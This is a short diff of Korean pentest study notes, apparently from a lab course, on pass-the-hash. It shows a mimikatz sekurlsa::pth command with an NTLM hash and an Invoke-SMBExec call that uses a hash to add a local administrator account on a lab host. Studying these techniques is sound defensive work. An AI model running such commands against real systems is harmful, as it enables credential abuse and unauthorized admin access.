@@ -471,7 +471,7 @@ PS> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
 ```c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit```<br/>
 
 ### Pass the Hash with PowerShell Invoke-TheHash(Windows)
-- [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)는 WMI 및 SMB로 해시 패스 공격을 수행하기 위한 PowerShell 함수 모음<br/>
+- [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)는 WMI 및 SMB로 해시 패스 공격을 수행하기 위한 PowerShell 함수 모음<br/>
 ```
 PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
 PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
